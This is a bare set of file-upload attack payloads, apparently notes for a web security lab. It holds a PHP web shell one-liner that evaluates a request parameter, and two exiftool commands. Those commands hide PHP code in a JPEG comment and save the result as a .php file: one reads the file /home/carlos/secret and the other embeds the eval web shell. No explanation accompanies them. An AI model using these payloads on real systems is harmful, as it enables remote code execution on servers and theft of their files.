<?php @eval($_REQUEST['krm']); ?>


exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" 01.jpg -o 01_jpg.php
exiftool -Comment="<?php echo 'START ' . \@eval($_REQUEST['krm']) . ' END'; ?>" 01.jpg -o 01_jpg.php